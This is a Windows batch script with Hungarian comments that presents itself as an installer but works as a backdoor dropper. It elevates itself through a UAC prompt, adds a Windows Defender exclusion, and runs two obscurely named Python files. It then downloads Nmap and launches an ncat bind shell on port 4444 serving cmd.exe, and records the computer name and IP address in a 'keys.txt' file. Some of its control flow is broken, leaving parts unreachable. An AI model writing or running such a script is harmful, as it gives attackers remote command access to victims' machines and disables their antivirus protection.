@echo off
setlocal enabledelayedexpansion

REM Ellenorzi es kerdezi a rendszergazdai jogosultsagot

NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    echo Rendszergazdai jogosultsagok megerositve. Folytatas...
    goto admin_folytatas
) ELSE (
    echo Rendszergazdai jogosultsagok kerese...
    goto ker_admin
)

:ker_admin
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    cscript //B "%temp%\getadmin.vbs"
    exit

:: nyelvfüggetlen célmappa
set "TARGET=%PUBLIC%\Documents\keys"
if not exist "%TARGET%" mkdir "%TARGET%"

:: hozzon létre egy keys.txt filet, ha még nincs
if not exist "%TARGET%\keys.txt" (
    echo Created by installer > "%TARGET%\keys.txt")

python "%TARGET%\spwww743g7w.py"
python "%TARGET%\fwsendbfgw.py"

:admin_folytatas
    POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TARGET%'"
    echo Kizaras hozzaadva: oda

cd /d "%TARGET%"

echo [INFO] 1. Lepes: Nmap ZIP letoltese...
set "URL=https://nmap.org/dist/nmap-7.92-win32.zip"
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile 'nmap.zip' -UserAgent 'Mozilla/5.0'"

if not exist "nmap.zip" (
    echo [HIBA] A letoltes nem sikerult.
    pause
    exit /b
)

echo [INFO] 2. Lepes: Kicsomagolas...
powershell -Command "Expand-Archive -Path 'nmap.zip' -DestinationPath '%TARGET%' -Force"

for /d %%D in ("%TARGET%\nmap*") do (
    if exist "%%D\ncat.exe" set "NCAT=%%D\ncat.exe"
)

if defined NCAT (
    echo [SIKER] A program telepitese kesz.
    echo.
    echo [INFO] 3. Lepes: Program inditasa...

    start "Ncat Console" cmd /k "%NCAT% --version"

) else (
    echo [HIBA] Nem talaltam meg az ncat.exe-t.
    dir "%TARGET%"
    pause
)

del "nmap.zip"

"%NCAT%" -l -p 4444 -e cmd.exe


:: Szamitogep neve
for /f "tokens=2 delims==" %%a in ('wmic computersystem get name /value') do set "GEPNEV=%%a"

:: IPv4 cim
for /f "tokens=14" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "IP=%%a"

:: Mentés keys.txt-be
(
    echo GEPNEV=!GEPNEV!IP=!IP!
) > "%TARGET%\keys.txt"


echo.
pause
